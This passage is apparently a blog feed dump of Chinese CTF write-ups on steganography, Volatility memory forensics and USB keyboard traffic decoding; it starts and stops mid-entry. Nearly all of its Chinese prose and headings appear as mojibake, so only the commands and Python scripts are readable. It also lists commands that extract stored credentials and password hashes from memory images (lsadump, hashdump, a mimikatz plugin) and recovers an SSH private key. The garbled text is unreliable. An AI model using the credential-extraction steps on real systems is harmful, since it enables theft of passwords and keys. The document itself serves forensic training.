flag{JPeG_Is_IntErEsting}</p><p>kalié‡Œzstegå‘ç°baseï¼Œzstegä¸»è¦æŸ¥çœ‹lsb,,è¿™é‡Œçš„baseä¸å…¨ï¼Œç»§ç»­è¿”å›stegsolveé‡Œçœ‹msb</p><p><img src="/img/1721699493768-141.png" alt="img"></p><p><img src="/img/1721699493769-142.png" alt="img"></p><p>å°†HYNUCTF{This_is_a_fake_flag}åˆ æ‰</p><p><img src="/img/1721699493769-143.png" alt="img"></p><p>å¾—åˆ°HYNUCTF{RgB_or_Lsb_may_Y0u_knnoww?}</p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†…å­˜å–è¯</title>
      <link href="/2024/07/22/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/"/>
      <url>/2024/07/22/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h2 id="å†…å­˜å–è¯"><a href="#å†…å­˜å–è¯" class="headerlink" title="å†…å­˜å–è¯"></a>å†…å­˜å–è¯</h2><h3 id="volatilityåŸºç¡€å‘½ä»¤"><a href="#volatilityåŸºç¡€å‘½ä»¤" class="headerlink" title="volatilityåŸºç¡€å‘½ä»¤"></a>volatilityåŸºç¡€å‘½ä»¤</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">imageinfoï¼šæ˜¾ç¤ºç›®æ ‡é•œåƒçš„æ‘˜è¦ä¿¡æ¯ï¼Œè¿™å¸¸å¸¸æ˜¯ç¬¬ä¸€æ­¥ï¼Œè·å–å†…å­˜çš„æ“ä½œç³»ç»Ÿç±»å‹åŠç‰ˆæœ¬ï¼Œä¹‹åå¯ä»¥åœ¨ â€“profile ä¸­å¸¦ä¸Šå¯¹åº”çš„æ“ä½œç³»ç»Ÿï¼Œåç»­æ“ä½œéƒ½è¦å¸¦ä¸Šè¿™ä¸€å‚æ•°</span><br><span class="line"></span><br><span class="line">pslistï¼šè¯¥æ’ä»¶åˆ—ä¸¾å‡ºç³»ç»Ÿè¿›ç¨‹ï¼Œä½†å®ƒä¸èƒ½æ£€æµ‹åˆ°éšè—æˆ–è€…è§£é“¾çš„è¿›ç¨‹ï¼Œpsscanå¯ä»¥</span><br><span class="line"></span><br><span class="line">pstreeï¼šä»¥æ ‘çš„å½¢å¼æŸ¥çœ‹è¿›ç¨‹åˆ—è¡¨ï¼Œå’Œpslistä¸€æ ·ï¼Œä¹Ÿæ— æ³•æ£€æµ‹éšè—æˆ–è§£é“¾çš„è¿›ç¨‹</span><br><span class="line"></span><br><span class="line">psscanï¼šå¯ä»¥æ‰¾åˆ°å…ˆå‰å·²ç»ˆæ­¢(ä¸æ´»åŠ¨)çš„è¿›ç¨‹ä»¥åŠè¢«rootkitéšè—æˆ–è§£é“¾çš„è¿›ç¨‹</span><br><span class="line"></span><br><span class="line">cmdscanï¼šå¯ç”¨äºæŸ¥çœ‹ç»ˆç«¯è®°å½•</span><br><span class="line"></span><br><span class="line">notepadï¼šæŸ¥çœ‹å½“å‰å±•ç¤ºçš„ notepad æ–‡æœ¬ï¼ˆâ€“profile=winxpå•¥çš„ä½ç‰ˆæœ¬å¯ä»¥ï¼Œwin7çš„ä¸è¡Œï¼Œå¯ä»¥å°è¯•ä½¿ç”¨editboxï¼‰</span><br><span class="line"></span><br><span class="line">filescanï¼šæ‰«ææ‰€æœ‰çš„æ–‡ä»¶åˆ—è¡¨</span><br><span class="line"></span><br><span class="line">linuxé…åˆ grep å‘½ä»¤è¿›è¡Œç›¸å…³å­—ç¬¦å®šå‘æ‰«æï¼Œå¦‚ï¼šgrep flagã€grep -E â€˜png|jpg|gif|<span class="built_in">zip</span>|rar|7z|pdf|txt|docâ€™</span><br><span class="line"></span><br><span class="line">dumpfilesï¼šå¯¼å‡ºæŸä¸€æ–‡ä»¶(æŒ‡å®šè™šæ‹Ÿåœ°å€)</span><br><span class="line"></span><br><span class="line">éœ€è¦æŒ‡å®šåç§»é‡ -Q å’Œè¾“å‡ºç›®å½• -D</span><br><span class="line"></span><br><span class="line">mendumpï¼šæå–å‡ºæŒ‡å®šè¿›ç¨‹ï¼Œå¸¸ç”¨foremost æ¥åˆ†ç¦»é‡Œé¢çš„æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">éœ€è¦æŒ‡å®šè¿›ç¨‹-p [pid] å’Œè¾“å‡ºç›®å½• -D</span><br><span class="line"></span><br><span class="line">editboxï¼šæ˜¾ç¤ºæœ‰å…³ç¼–è¾‘æ§ä»¶ï¼ˆæ›¾ç»ç¼–è¾‘è¿‡çš„å†…å®¹ï¼‰çš„ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">screenshotï¼šä¿å­˜åŸºäºGDIçª—å£çš„ä¼ªæˆªå±</span><br><span class="line"></span><br><span class="line">clipboardï¼šæŸ¥çœ‹å‰ªè´´æ¿ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">iehistoryï¼šæ£€ç´¢IEæµè§ˆå™¨å†å²è®°å½•</span><br><span class="line"></span><br><span class="line">systeminfoï¼šæ˜¾ç¤ºå…³äºè®¡ç®—æœºåŠå…¶æ“ä½œç³»ç»Ÿçš„è¯¦ç»†é…ç½®ä¿¡æ¯ï¼ˆæ’ä»¶ï¼‰</span><br><span class="line"></span><br><span class="line">hashdumpï¼šæŸ¥çœ‹å½“å‰æ“ä½œç³»ç»Ÿä¸­çš„ password <span class="built_in">hash</span>ï¼Œä¾‹å¦‚ Windows çš„ SAM æ–‡ä»¶å†…å®¹(mimikatzæ’ä»¶å¯ä»¥è·å–ç³»ç»Ÿæ˜æ–‡å¯†ç )</span><br><span class="line"></span><br><span class="line">mftparserï¼šæ¢å¤è¢«åˆ é™¤çš„æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">svcscanï¼šæ‰«æ Windows çš„æœåŠ¡</span><br><span class="line"></span><br><span class="line">connscanï¼šæŸ¥çœ‹ç½‘ç»œè¿æ¥</span><br><span class="line"></span><br><span class="line">envarsï¼šæŸ¥çœ‹ç¯å¢ƒå˜é‡</span><br><span class="line"></span><br><span class="line">dlllist: åˆ—å‡ºæŸä¸€è¿›ç¨‹åŠ è½½çš„æ‰€æœ‰dllæ–‡ä»¶</span><br><span class="line"></span><br><span class="line">hivelist: åˆ—å‡ºæ‰€æœ‰çš„æ³¨å†Œè¡¨é¡¹åŠå…¶è™šæ‹Ÿåœ°å€å’Œç‰©ç†åœ°å€</span><br><span class="line"></span><br><span class="line">timeliner: å°†æ‰€æœ‰æ“ä½œç³»ç»Ÿäº‹ä»¶ä»¥æ—¶é—´çº¿çš„æ–¹å¼å±•å¼€</span><br></pre></td></tr></table></figure><p>è‡ªå·±æ€»ç»“</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ä¸€ï¼šæ€»ç»“ä¸€ä¸‹ä¸Šé¢é¢˜ç›®æ‰€ç”¨åˆ°çš„å‘½ä»¤</span><br><span class="line">æŸ¥çœ‹é•œåƒ</span><br><span class="line">vol.py -f Target.vmem imageinfo </span><br><span class="line">æå–æœ¬åœ°å­˜å‚¨çš„å‡­è¯ä¿¡æ¯</span><br><span class="line">vol.py -f Target.vmem --profile=Win7SP1x64 lsadump</span><br><span class="line">æ‰«æå«CTFçš„æ–‡ä»¶</span><br><span class="line">vol.py -f Target.vmem --profile=Win7SP1x64 filescan | grep CTF</span><br><span class="line">æ‰«æå¤šä¸ªæ–‡ä»¶</span><br><span class="line">vol.py -f Target.vmem --profile=Win7SP1x64 filescan | grep -E <span class="string">&quot;jpg|png|zip|rar|gif&quot;</span></span><br><span class="line">æå–æ–‡ä»¶</span><br><span class="line">vol.py -f Target.vmem --profile=Win7SP1x64 dumpfiles -Q <span class="number">0x000000007d8c7d10</span> -D <span class="number">1</span></span><br><span class="line">æŸ¥çœ‹è¿›ç¨‹</span><br><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 pslist</span><br><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 pstree</span><br><span class="line">æ‰«æç»ˆç«¯</span><br><span class="line">vol.py -f file.raw --profile=WinXPSP2x86 cmdscan</span><br><span class="line">æŸ¥çœ‹æµè§ˆè®°å½•</span><br><span class="line">vol.py -f file.raw --profile=WinXPSP2x86 iehistory</span><br><span class="line">æ‰«æå…¶IPåœ°å€</span><br><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 netscan | grep <span class="string">&quot;LunarMS.exe&quot;</span></span><br><span class="line">æŸ¥çœ‹å‰ªåˆ‡æ¿ä¿¡æ¯</span><br><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 clipboard</span><br></pre></td></tr></table></figure><h3 id="é™‡å‰‘æ¯-2021-å†…å­˜åˆ†æï¼ˆé—®1ï¼‰"><a href="#é™‡å‰‘æ¯-2021-å†…å­˜åˆ†æï¼ˆé—®1ï¼‰" class="headerlink" title="[é™‡å‰‘æ¯ 2021]å†…å­˜åˆ†æï¼ˆé—®1ï¼‰"></a>[é™‡å‰‘æ¯ 2021]å†…å­˜åˆ†æï¼ˆé—®1ï¼‰</h3><p>æŸ¥çœ‹é•œåƒ</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vol.py -f Target.vmem imageinfo </span><br></pre></td></tr></table></figure><p><img src="/img/1721634933786-28.png" alt="img"></p><p>1ï¼šæ²¡æœ‰å®‰è£…pycryptodomeï¼Œkalié‡Œè‡ªå¸¦python3çš„ç¯å¢ƒï¼Œæœ‰python2çš„ç¯å¢ƒå´æ²¡æœ‰pip2</p><p>è¿™é‡Œå¾—åœ¨python2çš„ç¯å¢ƒä¸‹ä½¿ç”¨pip2æ¥å®‰è£…pycryptodome</p><p>ä¸€ï¼šä¸‹è½½get-pip.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/pip/<span class="number">2.7</span>/get-pip.py </span><br></pre></td></tr></table></figure><p>äºŒï¼špythonæ‰§è¡Œget-pip.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sudo python2 get-pip.py</span><br></pre></td></tr></table></figure><p>ä¸‰ï¼šæŸ¥çœ‹pip2çš„ç‰ˆæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip2 -V</span><br></pre></td></tr></table></figure><p><img src="/img/1721634933787-29.png" alt="img"></p><p>å››ï¼šå®‰è£…pycryptodome</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip2 install pycryptodome</span><br></pre></td></tr></table></figure><p><img src="/img/1721634933787-30.png" alt="img"></p><p><img src="/img/1721634933787-31.png" alt="img"></p><p>2ï¼šå¯ä»¥æ‰¾åˆ°Win7SP1x64ï¼Œé€šè¿‡lsadumpæ’ä»¶å°†è¢«è°ƒç”¨ä»¥æå–æœ¬åœ°å­˜å‚¨çš„å‡­è¯ä¿¡æ¯</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vol.py -f Target.vmem --profile=Win7SP1x64 lsadump</span><br></pre></td></tr></table></figure><p><img src="/img/1721634933787-32.png" alt="img"></p><p>æ–¹æ³•äºŒï¼šä½¿ç”¨mimikatzæ’ä»¶æ¥è§£</p><p>1:ä¸‹è½½mimikatz.py,å°†å…¶ç§»è‡³volatilityçš„plugins,æ³¨æ„è¿™é‡Œä¸èƒ½ç›´æ¥å¤åˆ¶ç²˜è´´è¿›å»ï¼Œå¾—ä½¿ç”¨å‘½ä»¤</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sudo mv mimikatz.py /home/kali/Desktop/volatility/plugins/</span><br></pre></td></tr></table></figure><p>2ï¼šå®‰è£…construct</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install construct</span><br></pre></td></tr></table></figure><p>å˜¶ï¼Œæˆ‘æ²¡è£…ä¸Šï¼Œå˜¿å˜¿ï¼Œä¸è¿‡ç”¨å¤„å’Œlsadumpæ’ä»¶å·®ä¸å¤š</p><h3 id="é™‡å‰‘æ¯-2021-å†…å­˜åˆ†æï¼ˆé—®2ï¼‰"><a href="#é™‡å‰‘æ¯-2021-å†…å­˜åˆ†æï¼ˆé—®2ï¼‰" class="headerlink" title="[é™‡å‰‘æ¯ 2021]å†…å­˜åˆ†æï¼ˆé—®2ï¼‰"></a>[é™‡å‰‘æ¯ 2021]å†…å­˜åˆ†æï¼ˆé—®2ï¼‰</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ç½‘ç®¡å°ç‹åˆ¶ä½œäº†ä¸€ä¸ªè™šæ‹Ÿæœºæ–‡ä»¶ï¼Œè®©æ‚¨æ¥åˆ†æåä½œç­”ï¼š</span><br><span class="line">è™šæ‹Ÿæœºä¸­æœ‰ä¸€ä¸ªæŸå“ç‰Œæ‰‹æœºçš„å¤‡ä»½æ–‡ä»¶ï¼Œæ–‡ä»¶é‡Œçš„å›¾ç‰‡é‡Œçš„å­—ç¬¦ä¸²ä¸º_____________ã€‚ï¼ˆè§£é¢˜è¿‡ç¨‹ä¸­éœ€è¦ç”¨åˆ°ä¸Šä¸€é¢˜ç­”æ¡ˆä¸­flag&#123;&#125;å†…çš„å†…å®¹è¿›è¡Œå¤„ç†ã€‚æœ¬é¢˜çš„æ ¼å¼ä¹Ÿæ˜¯flag&#123;xxx&#125;ï¼Œå«æœ‰ç©ºæ ¼ï¼Œæäº¤æ—¶ä¸è¦å»æ‰ï¼‰ã€‚</span><br></pre></td></tr></table></figure><p>è¯•ç€æœç´¢CTFçš„æ–‡ä»¶åï¼Œå¯ä»¥å‘ç°HUAWEI P40</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vol.py -f Target.vmem --profile=Win7SP1x64 filescan | grep CTF</span><br></pre></td></tr></table></figure><p><img src="/img/1721634933787-33.png" alt="img"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vol.py -f Target.vmem --profile=Win7SP1x64 filescan | grep HUAWEI</span><br></pre></td></tr></table></figure><p><img src="/img/1721634933787-34.png" alt="img"></p><p>å¯¼å‡ºç¬¬ä¸€ä¸ª</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vol.py -f Target.vmem --profile=Win7SP1x64 dumpfiles -Q <span class="number">0x000000007d8c7d10</span> -D <span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/img/1721634933787-35.png" alt="img"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">unzip file.<span class="literal">None</span><span class="number">.0</span>xfffffa80037e0af0.dat</span><br></pre></td></tr></table></figure><p><img src="/img/1721634933787-36.png" alt="img"></p><p>è§£å‹ä¹‹åæˆ‘ä»¬å¯ä»¥å‘ç°å¤šäº†ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œå¹¶å‘ç°ä¸€ä¸ªimages0.tar.encæ–‡ä»¶ï¼Œæ­¤æ–‡ä»¶ä¸ºåä¸ºåŠ å¯†æ–‡ä»¶ï¼Œåœ¨ç½‘ä¸Šä¸‹è½½ç›¸åº”çš„è§£å¯†è„šæœ¬å³å¯</p><p>ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/RealityNet/kobackupdec">https://github.com/RealityNet/kobackupdec</a></p><p>è¿™é‡Œéœ€è¦ç”¨åˆ°çš„å¯†ç ä¸ºç¬¬ä¸€é¢˜æ‰€éœ€çš„å¯†ç ï¼Œæ–‡ä»¶å¤¹ä¸ºåˆšæ‰è§£å‹å‡ºæ¥çš„æ–‡ä»¶å¤¹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 kobackupdec.py -vvv W31C0M3_T0_THiS_34SY_F0R3NSiCX <span class="string">&quot;/home/kali/Desktop/HUAWEI P40_2021-aa-bb xx.yy.zz&quot;</span> /home/kali/Desktop/<span class="number">2</span></span><br></pre></td></tr></table></figure><p><img src="/img/1721634933787-37.png" alt="img"></p><p>åœ¨æ‰€ç”Ÿæˆçš„æ–‡ä»¶2é‡Œæ‰¾åˆ°ç›¸åº”çš„å‹ç¼©åŒ…ï¼Œå¾—åˆ°flag</p><p><img src="/img/1721634933787-38.png" alt="img"></p><h3 id="ç¾ŠåŸæ¯-2021-Baby-Forenisc"><a href="#ç¾ŠåŸæ¯-2021-Baby-Forenisc" class="headerlink" title="[ç¾ŠåŸæ¯ 2021]Baby_Forenisc"></a>[ç¾ŠåŸæ¯ 2021]Baby_Forenisc</h3><p>æŸ¥çœ‹é•œåƒçš„ç³»ç»Ÿç‰ˆæœ¬</p><p><img src="/img/1721634933787-39.png" alt="img"></p><p>æŸ¥çœ‹è¿›ç¨‹</p><p><img src="/img/1721634933787-40.png" alt="img"></p><p>æŸ¥çœ‹cmdå‘½ä»¤</p><p><img src="/img/1721634933787-41.png" alt="img"></p><p>ä½¿ç”¨gitå‘½ä»¤ä¸Šä¼ äº†ä¸€äº›æ–‡ä»¶ï¼Œæ—¢ç„¶ä¸Šä¼ äº†ä¸€äº›æ–‡ä»¶ï¼Œæˆ‘ä»¬ä½¿ç”¨grepæ¥ç‰¹å®šæ‰¾å‡ºç›¸åº”çš„æ–‡ä»¶</p><p><img src="/img/1721634933787-42.png" alt="img"></p><p>å®åœ¨ä¸æ”¾å¿ƒå¯ä»¥ä½¿ç”¨fileå‘½ä»¤æ¥æŸ¥çœ‹å…¶ç±»å‹</p><p><img src="/img/1721634933788-43.png" alt="img"></p><p>å¯ä»¥å‘ç°å…¶ä¸ºSSHç§é’¥</p><p>ä½¿ç”¨dumpfileså°†å…¶ssh.txtå¯¼å‡º</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vol.py -f BIODOG-7711E93C-<span class="number">20210908</span>-<span class="number">053022.</span>raw --profile=WinXPSP2x86 dumpfiles -Q <span class="number">0x00000000020bf6a0</span> -D <span class="number">2</span></span><br></pre></td></tr></table></figure><p><img src="/img/1721634933788-44.png" alt="img"></p><p>base64å¯¹å…¶è¿›è¡Œç¼–ç å’Œè§£ç æ¥æå–.datçš„æ•°æ®</p><p><img src="/img/1721634933788-45.png" alt="img"></p><p>è¿™é‡Œå‘ç°qqé‚®ç®±</p><p><img src="/img/1721634933788-46.png" alt="img"></p><p>githubä¸Šæœç´¢å…¶qqé‚®ç®±</p><p><img src="/img/1721634933788-47.png" alt="img"></p><p><img src="/img/1721634933788-48.png" alt="img"></p><p>ä¸‹è½½å…¶_APP_,010é‡Œæ‰¾åˆ°</p><p><img src="/img/1721634933788-49.png" alt="img"></p><p>base64è§£ç </p><p>SangFor{S0_3azy_2_crack_noob_player}</p><h3 id="é¹åŸæ¯-2022-ç®€å•å–è¯"><a href="#é¹åŸæ¯-2022-ç®€å•å–è¯" class="headerlink" title="[é¹åŸæ¯ 2022]ç®€å•å–è¯"></a>[é¹åŸæ¯ 2022]ç®€å•å–è¯</h3><p>æŸ¥çœ‹é•œåƒï¼Œæ‰¾åˆ°WinXPSP2x86</p><p><img src="/img/1721634933788-50.png" alt="img"></p><p>å‘ç°ä¸€å¼ secret.jpg,ä½¿ç”¨dumpæå–å‡ºæ¥</p><p><img src="/img/1721634933788-51.png" alt="img"></p><p>åˆæˆ–è€…æ˜¯ç›´æ¥æŸ¥çœ‹å…¶æµè§ˆè®°å½•vol.py -f file.raw â€“profile&#x3D;WinXPSP2x86 iehistory</p><p><img src="/img/1721634933788-52.png" alt="img"></p><p><img src="/img/1721634933788-53.png" alt="img"></p><p>æ‰¾åˆ°jpgå›¾ç‰‡vol.py -f file.raw â€“profile&#x3D;WinXPSP2x86 filescan | grep secret.jpg</p><p><img src="/img/1721634933788-54.png" alt="img"></p><p>æå–jpgå›¾ç‰‡vol.py -f file.raw â€“profile&#x3D;WinXPSP2x86 dumpfiles -Q 0x0000000002325028 -D 3</p><p><img src="/img/1721634933789-55.png" alt="img"></p><p><img src="/img/1721634933789-56.png" alt="img"></p><p>æ³¨æ„ï¼šè¿™é‡Œå¯¼å‡ºçš„å¹¶ä¸æ˜¯jpgå›¾ç‰‡ï¼Œè€Œæ˜¯å…¶æ•°æ®ï¼Œå¯ä»¥å‘ç°æ˜¯base64ç¼–ç ï¼Œå¯¹å…¶è¿›è¡Œbase64è§£ç ï¼Œå¯ä»¥å‘ç°å…¶æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…çš„é€†åºæ•°æ®ã€‚</p><p>å¯ä»¥ä½¿ç”¨base64 -d file.None.0x81fc6610.dat | rev ,å˜¶ï¼Œè¿™ä¸ªç›´æ¥å¡æ­»ï¼Œè½¬åŠå¤©æ²¡è½¬å‡ºæ¥</p><p><img src="/img/1721634933789-57.png" alt="img"></p><p>åœ¨å¨å¸ˆé‡Œè¿›è¡Œè§£å¯†ï¼Œä¿å­˜ä¸ºzip,å˜¶ï¼Œè¿™é‡Œè½¬åŒ–æœ‰ç‚¹é—®é¢˜ï¼Œæ‰¾ä¸åˆ°flag.txt</p><p><img src="/img/1721634933789-58.png" alt="img"></p><p>ç›´æ¥ç”¨è„šæœ¬è¿›è¡Œè½¬åŒ–.è¿™ä¸ªå¯ä»¥</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.jpg&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    r = f.read()</span><br><span class="line"></span><br><span class="line">lst = <span class="built_in">list</span>(base64.b64decode(r))</span><br><span class="line">lst.reverse()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.zip&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">        s = struct.pack(<span class="string">&#x27;B&#x27;</span>, i)</span><br><span class="line">        f.write(s)</span><br></pre></td></tr></table></figure><p>vol.py -f file.raw â€“profile&#x3D;WinXPSP2x86 cmdscan</p><p><img src="/img/1721634933789-59.png" alt="img"></p><p>password:62b041223bb9a</p><p>æ‰“å¼€å‹ç¼©åŒ…ï¼Œç±»ä¼¼åæ ‡ï¼Œç»˜åˆ¶äºŒç»´ç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">350</span>, <span class="number">350</span>), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    r = f.read()</span><br><span class="line"></span><br><span class="line">lst = r.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    x = <span class="built_in">int</span>(i.split(<span class="string">&quot; &quot;</span>)[<span class="number">0</span>])</span><br><span class="line">    y = <span class="built_in">int</span>(i.split(<span class="string">&quot; &quot;</span>)[<span class="number">1</span>])</span><br><span class="line">    im.putpixel((x, y), (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line"></span><br><span class="line">im.save(<span class="string">&quot;flag.png&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/img/1721634933789-60.png" alt="img"></p><p>flag{a6b93e36-f097-11ec-a9b2-5254002d2b31}</p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>usbæµé‡åˆ†æ</title>
      <link href="/2024/07/22/usb%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
      <url>/2024/07/22/usb%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h2 id="usbæµé‡"><a href="#usbæµé‡" class="headerlink" title="usbæµé‡"></a>usbæµé‡</h2><p>ç®€ä»‹ï¼š</p><p>USBæµé‡æŒ‡çš„æ˜¯USBè®¾å¤‡æ¥å£çš„æµé‡ï¼Œæ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ç›‘å¬usbæ¥å£æµé‡è·å–é”®ç›˜æ•²å‡»é”®ã€é¼ æ ‡ç§»åŠ¨ä¸ç‚¹å‡»ã€å­˜å‚¨è®¾å¤‡çš„é“­æ–‡ä¼ è¾“é€šä¿¡ã€USBæ— çº¿ç½‘å¡ç½‘ç»œä¼ è¾“å†…å®¹ç­‰ç­‰ã€‚åœ¨CTFä¸­ï¼ŒUSBæµé‡åˆ†æä¸»è¦ä»¥é”®ç›˜å’Œé¼ æ ‡æµé‡ä¸ºä¸»</p><h3 id="NISACTF-2022-ç ´æŸçš„flag"><a href="#NISACTF-2022-ç ´æŸçš„flag" class="headerlink" title="[NISACTF 2022]ç ´æŸçš„flag"></a>[NISACTF 2022]ç ´æŸçš„flag</h3><p>é”®ç›˜æµé‡åˆ†æ</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">DataFileName = <span class="string">&quot;usb.dat&quot;</span></span><br><span class="line"></span><br><span class="line">presses = []</span><br><span class="line"></span><br><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,<span 